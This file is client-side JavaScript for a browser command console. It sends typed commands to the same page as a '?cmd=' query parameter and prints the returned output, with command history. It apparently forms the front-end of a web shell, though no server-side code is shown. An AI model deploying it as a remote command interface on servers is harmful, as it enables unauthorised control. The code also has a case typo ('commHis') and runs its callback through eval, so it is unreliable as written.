var CommHis=new Array();
var HisP;

function doReq(_1,_2,_3)
{
	var HR=false;
	if(window.XMLHttpRequest){
		HR=new XMLHttpRequest();
		if(HR.overrideMimeType)
		{
			HR.overrideMimeType("text/xml");
		}
	}

	else
	{
		if(window.ActiveXObject)
			{
				try
					{
						HR=new ActiveXObject("Msxml2.XMLHTTP");
					}
				catch(e)
				{
					try
					{
					HR=new ActiveXObject("Microsoft.XMLHTTP");
					}
				catch(e)
					{
					}
				}
			}
	}
	
	if(!HR)
	{
	return false;
	}

	HR.onreadystatechange=function()
	{
		if(HR.readyState==4)
			{
				if(HR.status==200)
				{
					if(_3)
						{
							eval(_2+"(HR.responseXML)");
						}
					else
						{
							eval(_2+"(HR.responseText)");
						}	
				}
			}
	};
	HR.open("GET",_1,true);HR.send(null);
}

function pR(rS)
{
	var _6=document.getElementById("outt");
	var _7=rS.split("\n\n");
	var _8=document.getElementById("cmd").value;_6.appendChild(document.createTextNode(_8));
	_6.appendChild(document.createElement("br"));
	
	for(var _9 in _7)
		{
		var _a=document.createElement("pre");
		_a.style.display="inline";line=document.createTextNode(_7[_9]);_a.appendChild(line);_6.appendChild(_a);
		_6.appendChild(document.createElement("br"));
		}
		_6;_6.scrollTop=_6.scrollHeight;
		document.getElementById("cmd").value="";
}

function keyE(_b)
{
	switch(_b.keyCode)
	{
	case 13:var _c=document.getElementById("cmd").value;		
		if(_c)
			{
				var p=document.getElementById("path").value;
				CommHis[CommHis.length]=_c;
				HisP=CommHis.length;
				var _d=document.location.href+"?cmd="+escape(_c);
				doReq(_d,"pR");
			}
		 break;

	case 38:if(HisP>0)
			{
				HisP--;document.getElementById("cmd").value=CommHis[HisP];
			}
	break;
	case 40:if(HisP<commHis.length-1)
			{
				HisP++;document.getElementById("cmd").value=CommHis[HisP];
			}
	break;
	
	default:break;
	}
}